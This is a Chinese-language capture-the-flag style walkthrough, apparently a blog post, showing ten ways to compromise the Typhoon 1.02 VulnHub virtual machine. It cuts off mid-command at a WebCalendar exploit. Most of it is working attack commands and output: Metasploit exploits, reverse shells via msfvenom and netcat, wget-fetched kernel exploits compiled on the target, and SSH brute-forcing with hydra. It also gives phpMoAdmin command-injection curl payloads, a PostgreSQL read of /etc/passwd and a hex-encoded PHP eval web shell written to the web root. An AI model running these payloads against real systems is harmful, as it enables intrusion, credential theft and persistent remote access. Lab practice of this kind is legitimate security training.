@@ -1,0 +1,865 @@
+标题: Penetration Techniques of Ethical Hackers: Based on Typhoon 1.02
+
+创建: 2024-07-21 19:21
+更新: 
+链接: 
+
+本文将展示如何使用五种及以上的方式
+渗透[-TYPHOON: 1.02-]这台虚拟机
+
+所有操作均在VMware Workstation Pro上进行
+
+=====================================
+[-首要准备-]
+
+[-TYPHOON: 1.02-]虚拟机:
+	https://www.vulnhub.com/entry/typhoon-102,267/
+
+[-Kali Linux-]操作系统:
+	https://www.kali.org/get-kali/
+
+[-Windows-]虚拟机软件:
+	VMware Workstation Pro
+	VirtualBox
+
+以上准备请自行完成, 本文不做介绍
+
+=====================================
+[-情报收集-]
+
+kali@kali[~]$ ifconfig
+
+在[-eth0-]找到[-inet-]后面的地址
+本文是[-192.168.220.128-]
+每台虚拟机的地址均不相同, 请以自行操作的为准
+
+利用 Kali 自带的 Nmap 对网段进行扫描
+以下命令选其中一种就行
+
+kali@kali[~]$ nmap 192.168.220.0/24
+Nmap scan report for 192.168.220.132 (192.168.220.132)
+Host is up (0.00088s latency).
+Not shown: 983 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+110/tcp  open  pop3
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+143/tcp  open  imap
+445/tcp  open  microsoft-ds
+631/tcp  open  ipp
+993/tcp  open  imaps
+995/tcp  open  pop3s
+2049/tcp open  nfs
+3306/tcp open  mysql
+5432/tcp open  postgresql
+8080/tcp open  http-proxy
+
+kali@kali[~]$ nmap -sP 192.168.220.0/24
+Nmap scan report for 192.168.220.132 (192.168.220.132)
+Host is up (0.00031s latency).
+
+现在已经得到目标机器的地址
+继续使用 Nmap 进行全端口扫描
+kali@kali[~]$ nmap -p- -A 192.168.220.132
+
+经过 Nmap 的扫描后, 会发现目标机器上有很多开放端口:
+( 端口详情请参考: https://www.browserscan.net/zh/port-scanner )
+21/tcp    open  ftp         vsftpd 3.0.2
+22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp        Postfix smtpd
+53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+110/tcp   open  pop3        Dovecot pop3d
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp   open  imap        Dovecot imapd (Ubuntu)
+445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 1.7
+993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3    Dovecot pop3d
+2049/tcp  open  nfs         2-4 (RPC #100003)
+3306/tcp  open  mysql       MySQL (unauthorized)
+5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
+6379/tcp  open  redis       Redis key-value store 4.0.11
+8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+27017/tcp open  mongodb     MongoDB 3.0.15 3.0.15
+
+现在使用 drib 对目标机器进行 web目录枚举
+kali@kali[~]$ dirb http://192.168.220.132/
+
+通过分析, 发现目标机器存在以下目录文件:
+http://192.168.220.132/cms/
+http://192.168.220.132/drupal/
+http://192.168.220.132/javascript/
+http://192.168.220.132/phpmyadmin/
+http://192.168.220.132/robots.txt
+
+至此, 情报收集暂告一段落
+
+=====================================
+[-渗透方案0x00 "Drupal, 你也不想让别人发现你的秘密吧~"-]
+
+在 Kali 中利用 MSF 进行对漏洞的搜索
+kali@kali[~]$ sudo msfdb init
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+
+kali@kali[~]$ msfconsole -q
+msf6 > search drupal
+
+在显示的模块中找到 exploit/unix/webapp/drupal_drupalgeddon2 并进行利用
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
+
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.220.132
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set targeturi /drupal
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
+
+[*] Started reverse TCP handler on 192.168.220.128:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending stage (39927 bytes) to 192.168.220.132
+[*] Meterpreter session 1 opened (192.168.220.128:4444 -> 192.168.220.132:41272)
+
+接着尝试反弹shell
+meterpreter > shell
+Process 3609 created.
+Channel 0 created.
+(命令) whoami
+(回复) www-data
+(命令) pwd
+(回复) /var/www/html/drupal
+
+现在来获得稳定的shell
+(命令) /bin/bash -i
+bash: cannot set terminal process group (2559): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@typhoon:/var/www/html/drupal$ uname -a
+uname -a
+Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+
+发现其版本为 [-3.13.0-32-generic-]
+新建一个 Kali 终端 [-Ctrl+Alt+T-]
+kali@kali[~]$ searchsploit 3.13.0
+
+选定所使用的脚本, 并将其部署到目标机器
+kali@kali[~]$ searchsploit -m linux/local/37292.c
+kali@kali[~]$ python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+回到之前暂时被控制的目标机器, 并执行以下命令
+www-data@typhoon:/var/www/html/drupal$ wget http://192.168.220.128:8080/37292.c
+
+发现存在以下问题, 但请自行解决
+Cannot write to '37292.c' (Permission denied).
+
+在目标机器编译C语言脚本
+www-data@typhoon:/var/www/html$ gcc 37292.c -o ciallo
+www-data@typhoon:/var/www/html$ chmod +x ciallo
+www-data@typhoon:/var/www/html$ ./ciallo
+
+# whoami
+root
+
+提权成功
+已拿到root权限
+
+[-本章小结-]
+该渗透方案只是利用已知漏洞进行渗透, 同时利用已有脚本进行提权
+但未能介绍其原理, 想要提升的朋友可以自行了解
+对于 MSF, 利用模块之后执行 options 命令会是一个好主意
+对于 Nmap, 不做过多阐述
+对于其他命令, 有些是Linux基础命令, 有些是Tools命令, 熟能生巧便是一切
+
+=====================================
+[-渗透方案0x01 "把SSH拆了!"-]
+
+在[-情报收集-]阶段, 发现存在:
+22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+
+这里仍然是利用已知漏洞进行渗透, 其目的是爆破出目标机器的用户名
+kali@kali[~]$ searchsploit openssh
+OpenSSH 2.3 < 7.7 - Username Enumeration
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)
+可以利用 searchsploit 中所提供的脚本进行渗透
+
+这是利用 MSF 进行渗透的方法
+kali@kali[~]$ sudo msfdb run
+msf6 > search ssh/ssh_
+msf6 > use auxiliary/scanner/ssh/ssh_enumusers
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > options
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 192.168.220.132
+
+在 /usr/share/metasploit-framework/data/wordlists/ 中找到 namelist.txt 并进行使用
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set user_file /usr/share/metasploit-framework/data/wordlists/namelist.txt
+
+因为采用的是暴力破解手段, 所以将线程稍调一下
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set threads 20
+
+接下来对SSH用户名进行爆破
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
+
+目标机器被爆破出的用户名
+[+] 192.168.220.132:22 - SSH - User 'admin' found
+
+新建一个 Kali 终端 [-Ctrl+Alt+T-]
+在 /usr/share/wordlists/ 中找到 rockyou.txt 并进行使用
+可能没有 rockyou.txt 这个文件, 只有一个 rockyou.txt.gz 这个压缩包, 解压请自行解决
+这里使用 hydra 对目标机器的SSH用户进行密码爆破, 命令二者择其一
+kali@kali[~]$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.220.132 ssh
+kali@kali[~]$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.220.132
+
+目标机器的SSH用户被爆破出的密码
+[22][ssh] host: 192.168.220.132   login: admin   password: metallica
+
+进行SSH远程登录目标机器
+kali@kali[~]$ ssh admin@192.168.220.132
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+admin@192.168.220.132's password: metallica
+admin@typhoon:~$
+
+接下来仍然是进行提权
+admin@typhoon:~$ sudo -l
+[sudo] password for admin: metallica
+Matching Defaults entries for admin on typhoon:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User admin may run the following commands on typhoon:
+    (ALL) ALL
+
+可以直接进行提权
+admin@typhoon:~$ sudo bash
+root@typhoon:~# whoami
+root
+
+提权成功
+已拿到root权限
+
+[-本章小结-]
+算不上什么厉害的技术, 还是利用的已知漏洞进行渗透
+后面的步骤也称不上完美, 防止爆破机器有多种手段, 但这些都是题外话
+
+=====================================
+[-渗透方案0x02 "什么? phpMoAdmin你难道要拒绝我吗?"-]
+
+在[-情报收集-]阶段, 发现存在:
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/mongoadmin/
+
+让我们看看 robots.txt 文件的介绍:
+robots.txt是一个文本文件, 它位于网站的根目录下, 用于指示搜索引擎蜘蛛 (robots) 哪些页面可以抓取, 哪些页面不应该抓取
+它是一种遵循 Robots 协议 (Robots Exclusion Protocol) 的标准, 用来管理搜索引擎的爬虫行为
+User-agent 表示指令适用的搜索引擎爬虫
+Disallow 表示禁止搜索引擎爬虫访问的路径，可以是一个具体的文件或目录
+
+打开浏览器对 http://192.168.220.132/robots.txt 进行访问
+User-agent: *
+Disallow: /mongoadmin/
+
+接着从该文本的输出中, 对 http://192.168.220.132/mongoadmin/ 进行访问
+在后台加载完成后, 查看后台数据泄露情况, 同时进行 [情报再收集] 以获得更多渗透方式
+
+在尝试点击 [stats] 之后
+页面跳转至 http://192.168.220.132/mongoadmin/index.php?action=getStats
+version
+
+    mongo: 3.0.15 (64-bit)
+    mongoPhpDriver: 1.6.16
+    phpMoAdmin: 1.0.9
+    php: 5.5.9-1ubuntu4.26 (64-bit)
+    gitVersion: b8ff507269c382bc100fc52f75f48d54cd42ec3b
+
+发现 phpMoAdmin 的版本为 1.0.9
+进入漏洞数据库查找相应漏洞利用 https://www.exploit-db.com/
+相关漏洞利用分析 https://www.exploit-db.com/exploits/36251
+
+在 Kali 终端里执行命令, 命令二者择其一
+kali@kali[~]$ curl "http://192.168.220.132/mongoadmin/index.php" -d "object=1;system('id');exit"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+kali@kali[~]$ curl "http://192.168.220.132/mongoadmin/index.php?collection=admin&action=listRows&find=array();passthru('uname%20-a');exit;"
+Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+
+这一步之后具体怎么做, 请各位自行尝试, 熟能生巧
+
+再次回到 http://192.168.220.132/mongoadmin/
+点击 Change database
+点击 creds
+发现页面存在信息泄露
+[username] => typhoon
+[password] => 789456123
+
+接下来使用 SSH 对目标机器进行远程登录
+kali@kali[~]$ ssh typhoon@192.168.220.132
+typhoon@192.168.220.132's password: 789456123
+typhoon@typhoon:~$ 
+
+接下来仍然是进行提权, 获得更稳定的权限
+具体怎么做, 请各位自行探索
+
+[-本章小结-]
+仍然是利用已知漏洞对目标机器进行渗透
+检查数据泄露的信息可见是一个不错的渗透方式, 但请不要依赖这种方式
+
+=====================================
+[-渗透方案0x03 "不坦率可不行哟, LotusCMS~"-]
+
+在[-情报收集-]阶段, 发现存在:
+http://192.168.220.132/cms/
+
+打开浏览器对 http://192.168.220.132/cms/ 进行访问
+通过页面信息发现 "Powered by: LotusCMS"
+
+这里我们对 LotusCMS 粗暴一点也没关系
+kali@kali[~]$ sudo msfdb run
+msf6 > search lcms
+msf6 > use exploit/multi/http/lcms_php_exec
+msf6 exploit(multi/http/lcms_php_exec) > options
+msf6 exploit(multi/http/lcms_php_exec) > set rhosts 192.168.220.132
+msf6 exploit(multi/http/lcms_php_exec) > set uri /cms/
+msf6 exploit(multi/http/lcms_php_exec) > run
+
+[*] Started reverse TCP handler on 192.168.220.128:4444 
+[*] Using found page param: /cms/index.php?page=index
+[*] Sending exploit ...
+[*] Sending stage (39927 bytes) to 192.168.220.132
+[*] Meterpreter session 1 opened (192.168.220.128:4444 -> 192.168.220.132:49902)
+
+接着尝试反弹shell
+meterpreter > shell
+Process 2736 created.
+Channel 0 created.
+id    
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+后续步骤请参考 [-渗透方案0x00 "Drupal, 你也不想让别人发现你的秘密吧~"-] 章节
+里面讲述的非常详细, 不做过多阐述
+
+[-本章小结-]
+仍然利用 MSF 对目标机器进行渗透
+顶多算一个渗透思路, 建议自行研究漏洞的利用
+
+=====================================
+[-渗透方案0x04 "别让我逮到你, Tomcat!"-]
+
+在[-情报收集-]阶段, 发现存在:
+8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+
+打开浏览器对 http://192.168.220.132:8080 进行访问
+尝试访问 tomcat7-docs, 点击 here 进行访问
+发现 Tomcat 版本为 7.0.52
+
+返回页面 http://192.168.220.132:8080
+尝试访问 tomcat7-admin, 点击 manager webapp 进行访问
+尝试使用默认账户和密码进行登录 tomcat/tomcat, 发现登录成功
+
+接着利用 msfvenom 生成一个
+针对Linux系统的反向TCP shell payload
+并将其打包成一个WAR文件格式
+kali@kali[~]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.220.128 LPORT=8888 -f war -o ciallo.war
+
+访问刚刚登录进去的界面 http://192.168.220.132:8080/manager/html
+并将刚刚生成的 ciallo.war 上传
+成功便会显示 Message: OK
+
+利用 7z 对 ciallo.war 进行查看
+kali@kali[~]$ 7z l ciallo.war
+找到内部恶意代码文件 .jsp 项, 本文生成的是 dfrdutwovl.jsp
+
+在 Kali 中使用 nc 监听刚刚使用的的端口 8888
+然后在浏览器界面访问 http://192.168.220.132:8080/ciallo/dfrdutwovl.jsp
+
+kali@kali[~]$ nc -vlp 8888
+listening on [any] 8888 ...
+connect to [192.168.220.128] from 192.168.220.132 [192.168.220.132] 35658
+id
+uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
+
+对目标机器暂时控制成功
+
+另一种方法是通过 MSF 进行渗透
+kali@kali[~]$ sudo msfdb run
+msf6 > search tomcat
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+msf6 exploit(multi/http/tomcat_mgr_upload) > options
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 192.168.220.132
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > run
+
+[*] Started reverse TCP handler on 192.168.220.128:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying lgM9d1R0eimch5...
+[*] Executing lgM9d1R0eimch5...
+[*] Undeploying lgM9d1R0eimch5 ...
+[*] Sending stage (57971 bytes) to 192.168.220.132
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (192.168.220.128:4444 -> 192.168.220.132:49903)
+
+仍然尝试反弹shell
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+id
+uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
+
+接下来仍然是进行提权, 获得更稳定的权限
+具体怎么做, 请各位自行探索
+
+[-本章小结-]
+一个新的命令 msfvenom, 但仍属于 MSF 的一部分
+采用的是弱口令的方式进行渗透, 技术水平不予评价
+可能 tomcat 这个弱口令下次就没用了
+当然也可以尝试如何使用 MSF 进行用户名和密码的爆破
+
+=====================================
+[-渗透方案0x05 "谁把 Bashdoor 给打开了?"-]
+
+Shellshock, 又称Bashdoor
+是在Unix中广泛使用的Bash shell中的一个安全漏洞, 首次于2014年9月24日公开
+
+Nikto是一款开源的网页服务器扫描器, 它可以对网页服务器进行全面的多种扫描
+包含超过3300种有潜在危险的文件/CGIs; 超过625种服务器版本; 超过230种特定服务器问题
+
+在 Kali 上利用 Nikto 对目标机器站点进行扫描
+kali@kali[~]$ nikto -h http://192.168.220.132
++ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability.
+
+以下是对漏洞的相应介绍
+CVE-2014-6271: https://www.cvedetails.com/cve/cve-2014-6271
+CVE-2014-6278: https://www.cvedetails.com/cve/cve-2014-6278
+该漏洞允许攻击者在受影响的系统上运行任意命令, 使用 CGI 环境的 Web 服务器会受影响
+
+老思路, 利用 MSF 进行渗透
+kali@kali[~]$ sudo msfdb run
+msf6 > search shellshock
+msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 192.168.220.132
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+
+[*] Started reverse TCP handler on 192.168.220.128:4444 
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1017704 bytes) to 192.168.220.132
+[*] Meterpreter session 1 opened (192.168.220.128:4444 -> 192.168.220.132:58433)
+
+仍然尝试反弹shell
+meterpreter > shell
+Process 2733 created.
+Channel 1 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+接下来仍然是进行提权, 获得更稳定的权限
+具体怎么做, 请各位自行探索
+
+[-本章小结-]
+一如既往还是利用已知漏洞对目标机器进行渗透
+有关漏洞的利用以及原理, 可参考上述链接中的内容
+
+=====================================
+[-渗透方案0x06 "NFS的就是我的, 而我的还是我的"-]
+
+在[-情报收集-]阶段, 发现存在:
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+
+现在需要收集目标机器的挂载目录
+即可进入挂载目录从而利用共享目录进行渗透
+
+仍然利用 MSF 对目标机器进行探查
+kali@kali[~]$ sudo msfdb run
+msf6 > search nfs
+msf6 > use auxiliary/scanner/nfs/nfsmount
+msf6 auxiliary(scanner/nfs/nfsmount) > options
+msf6 auxiliary(scanner/nfs/nfsmount) > set rhosts 192.168.220.132
+msf6 auxiliary(scanner/nfs/nfsmount) > run
+
+[+] 192.168.220.132:111   - 192.168.220.132 Mountable NFS Export: /typhoon [*]
+[*] 192.168.220.132:111   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+得到目标机器的挂载目录 /typhoon
+
+新建一个 Kali 终端 [-Ctrl+Alt+T-]
+kali@kali[~]$ mkdir /tmp/typh00n
+kali@kali[~]$ sudo mount -t nfs 192.168.220.132:/typhoon /tmp/typh00n
+Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
+
+kali@kali[~]$ cd /tmp/typh00n
+kali@kali[/tmp/typh00n]$ ls
+secret
+
+kali@kali[/tmp/typh00n]$ file secret
+secret: ASCII text
+
+kali@kali[/tmp/typh00n]$ cat secret
+test file
+<rec0nm4st3r> R3c0n_m4steeeee3er_fl4g </rec0nm4st3r>
+
+现在有了一个共享的目录, 还有什么是不能完成的呢?
+
+最后别忘记在不使用时取消挂载
+kali@kali[~]$ sudo umount -t nfs 192.168.220.132:/typhoon
+
+[-本章小结-]
+由于目标机器未能对共享目录进行限制, 所以渗透才能得以顺利完成
+之后需要采用什么手段对目标机器进行更进一步的控制, 各位就大展身手吧
+
+=====================================
+[-渗透方案0x07 "来到 Linux 的大画家, Samba!"-]
+
+在[-情报收集-]阶段, 发现存在:
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
+
+CVE-2017-7494 漏洞介绍: https://nvd.nist.gov/vuln/detail/CVE-2017-7494
+
+漏洞利用条件:
+	服务器打开了文件/打印机共享端口445 (139)
+	共享文件拥有访问以及写入权限
+	攻击者知道共享的目录路径
+
+仍然使用 MSF 寻找并利用漏洞
+kali@kali[~]$ sudo msfdb run
+msf6 > search CVE-2017-7494
+msf6 > use exploit/linux/samba/is_known_pipename
+msf6 exploit(linux/samba/is_known_pipename) > options
+msf6 exploit(linux/samba/is_known_pipename) > set rhosts 192.168.220.132
+msf6 exploit(linux/samba/is_known_pipename) > run
+
+[*] 192.168.220.132:445 - Using location \\192.168.220.132\typhoon\ for the path
+[*] 192.168.220.132:445 - Retrieving the remote path of the share 'typhoon'
+[*] 192.168.220.132:445 - Share 'typhoon' has server-side path '/tmp
+[*] 192.168.220.132:445 - Uploaded payload to \\192.168.220.132\typhoon\gskOWYhV.so
+[*] 192.168.220.132:445 - Loading the payload from server-side path /tmp/gskOWYhV.so using \\PIPE\/tmp/gskOWYhV.so...
+[-] 192.168.220.132:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 192.168.220.132:445 - Loading the payload from server-side path /tmp/gskOWYhV.so using /tmp/gskOWYhV.so...
+[+] 192.168.220.132:445 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.220.128:34977 -> 192.168.220.132:445)
+
+whoami
+root
+
+CVE-2017-7494漏洞利用成功, 直接获取 root 权限
+
+[-本章小结-]
+像这样傻瓜式利用漏洞进行渗透, 水平将难以提升
+若想提升自己的能力, 还是那句老话, 多分析, 多做, 将一切想法落到实处
+
+=====================================
+[-渗透方案0x08 "把 PostgreSQL 放进冰箱需要几步?"-]
+
+在[-情报收集-]阶段, 发现存在:
+5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
+
+利用 MSF 对目标机器的 PostgreSQL 进行用户名和密码爆破
+kali@kali[~]$ sudo msfdb run
+msf6 > search postgres
+msf6 > use auxiliary/scanner/postgres/postgres_login
+msf6 auxiliary(scanner/postgres/postgres_login) > options
+msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts 192.168.220.132
+msf6 auxiliary(scanner/postgres/postgres_login) > run
+
+[+] 192.168.220.132:5432 - Login Successful: postgres:postgres@template1
+
+使用 PostgreSQL 基于终端的前端 "psql" 来登录目标机器的数据库
+kali@kali[~]$ psql -U postgres -h 192.168.220.132
+Password for user postgres: postgres@template1
+
+不出意外就是密码错误导致无法登录, 但解决这一问题很容易, 请自行解决
+
+密码错误之后, 再次登录目标机器的数据库
+kali@kali[~]$ psql -U postgres -h 192.168.220.132
+Password for user postgres: 
+psql (16.3 (Debian 16.3-1+b1), server 9.3.4)
+SSL connection (protocol: TLSv1.2, cipher: DHE-RSA-AES256-GCM-SHA384, compression: off)
+Type "help" for help.
+
+postgres=# 
+
+非常不错, 现在已经登录目标机器的 PostgreSQL
+接下来的操作需要对 PostgreSQL 有一定的基础了解
+如果还不知道什么是 PostgreSQL, 先请学习相应知识再来阅读
+
+postgres=# select pg_ls_dir('./');
+    pg_ls_dir    
+-----------------
+ PG_VERSION
+ pg_notify
+ pg_multixact
+ pg_subtrans
+ pg_serial
+ pg_snapshots
+ pg_stat
+ pg_clog
+ pg_xlog
+ base
+ pg_twophase
+ pg_tblspc
+ global
+ pg_stat_tmp
+ postmaster.opts
+ postmaster.pid
+(16 rows)
+
+如果使用以下命令, 发现无法跨目录读取文件, 且读取的文件存在权限限制
+postgres=# select pg_read_file('filename', 0, 10);
+
+现在的思路是建表, 然后将目标机器中的文件 copy 进表中
+postgres=# drop table if exists ciallo;
+NOTICE:  table "ciallo" does not exist, skipping
+DROP TABLE
+
+postgres=# create table ciallo(yuzu TEXT);
+CREATE TABLE
+
+postgres=# copy ciallo from '/etc/passwd';
+COPY 44
+
+postgres=# select * from ciallo limit 1 offset 0;
+              yuzu               
+---------------------------------
+ root:x:0:0:root:/root:/bin/bash
+(1 row)
+
+这条命令将读取 ciallo 表中的全部数据, 若要退出请按键盘的 "q"
+postgres=# select * from ciallo;
+[...]
+
+发现可以从 /etc/passwd 复制并从表读取文件中相关信息
+这为渗透打开了一个新思路, 利用数据库的表进行渗透
+postgres=# insert into ciallo values ('Ciallo~');
+INSERT 0 1
+
+postgres=# select * from ciallo;
+[...]
+Ciallo~
+(45 rows)
+(END)
+
+发现数据已经写入表中, 现在可以将表中的数据 copy 至另外的目录中
+postgres=# copy ciallo to '/tmp/CIALLO';
+COPY 45
+
+至于后续如何操作, 就留给各位发挥了
+
+另一种针对 PostgreSQL 的渗透思路
+pg_largeobject 大对象数据写入渗透
+postgres=# select lo_create(6666);
+ lo_create 
+-----------
+      6666
+(1 row)
+
+postgres=# delete from pg_largeobject where loid=6666;
+DELETE 0
+
+postgres=# insert into pg_largeobject (loid,pageno,data) values(6666, 0, decode('3c3f70687020406576616c28245f504f53545b274369616c6c6f20576f726c6421275d293b3f3e', 'hex'));
+INSERT 0 1
+                                                                                                                                        
+postgres=# select * from pg_largeobject where loid=6666;
+ loid | pageno |                                       data                                        
+------+--------+----------------------------------------------------------------------------------
+ 6666 |      0 | \x3c3f70687020406576616c28245f504f53545b274369616c6c6f20576f726c6421275d293b3f3e 
+(1 row)
+
+postgres=# select lo_export(6666, '/var/www/html/cialloworld.php');
+ lo_export 
+-----------
+         1 
+(1 row)
+
+然后删除大对象
+postgres=# select lo_unlink(6666);
+ lo_unlink 
+-----------
+         1
+(1 row)
+
+打开浏览器, 对 http://192.168.220.132/cialloworld.php 进行访问
+会发现是空白页面, 无伤大雅, 文件已经写入目标机器
+
+至于后续如何操作, 就留给各位发挥了
+
+[-本章小结-]
+利用 MSF 对 PostgreSQL 进行爆破实属下成, 只能算一种方法
+在后续渗透方面上, 对 PostgreSQL 数据库的利用才是精华
+
+=====================================
+[-渗透方案0x09 "什么, 你想要隐藏的 DNS ?"-]
+
+在[-情报收集-]阶段, 发现存在:
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3-Ubuntu
+
+端口53存在域, 提供 DNS 解析使用的
+渗透思路便是透过端口25去刺探当前 DNS
+kali@kali[~]$ telnet 192.168.220.132 25
+Trying 192.168.220.132...
+Connected to 192.168.220.132.
+Escape character is '^]'.
+220 typhoon ESMTP Postfix (Ubuntu)
+
+现在让对方的服务器来寻找渗透机器的域名
+EHLO kali.local
+250-typhoon
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+
+前面接收到的是目标机器的信息, 后面的是可执行的命令
+用VRFY探测DNS, 此命令可以确认邮件在传输当中的一个域名信息
+VRFY typhoon.local
+550 5.1.1 <typhoon.local>: Recipient address rejected: User unknown in local recipient table
+
+发现并没有此目标, 接着换一种方式
+VRFY root@typhoon.local
+252 2.0.0 root@typhoon.local
+
+现在确认邮件传递过程中存在这样一个域名信息
+DNS 服务器可能正在服务 typhoon.local, 接着尝试 DNS 区域传输
+
+使用 dig 网络工具
+dig 是一个网络管理命令行工具, 用于查询域名系统 (DNS)
+涉及 dig 的一个重要命令 axfr, 这是在一组 DNS 服务器之间复制 DNS 数据库的众多机制之一
+axfr 会将所有访问域名 typhoon.local 建立传输和响应的记录都显示出来
+
+kali@kali[~]$ dig axfr @192.168.220.132 typhoon.local
+typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600
+typhoon.local.          3600    IN      NS      ns1.typhoon.local.
+typhoon.local.          3600    IN      NS      ns2.typhoon.local.
+calendar.typhoon.local. 3600    IN      CNAME   wwww.typhoon.local.
+flag.typhoon.local.     3600    IN      TXT     "g00d_j0b_typh00n!"
+ns1.typhoon.local.      3600    IN      A       192.168.1.5
+ns2.typhoon.local.      3600    IN      A       192.168.1.6
+prisma.typhoon.local.   3600    IN      A       192.168.1.8
+secretmessage.typhoon.local. 3600 IN    TXT     "prismacsi.com"
+www.typhoon.local.      3600    IN      A       192.168.1.7
+typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600
+
+现在可以将 IP 和子域名放入 Kali 内部的 hosts 文件, 然后在浏览器中对子域名进行访问
+这里 calendar.typhoon.local. 子域名存在问题
+CNAME 记录中的目标应该是 "www.typhoon.local" 而不是 "wwww.typhoon.local"
+
+使用文本编辑器将 IP 和子域名写入 hosts 文件中
+kali@kali[~]$ sudo nano /etc/hosts
+kali@kali[~]$ cat /etc/hosts
+192.168.220.132 calendar.typhoon.local
+
+接着在浏览器中访问 calendar.typhoon.local
+在网页收集到信息 WebCalendar v1.2.4 (08 Aug 2011)
+
+利用 searchsploit 查找 WebCalendar 相关漏洞
+kali@kali[~]$ searchsploit webcalendar
+
+这里发现 linux/webapps/18797.rb 可以使用
+
+仍然使用 MSF 进行对漏洞的利用
+kali@kali[~]$ sudo msfdb run
+msf6 > search webcalendar
+msf6 > use exploit/linux/http/webcalendar_settings_exec
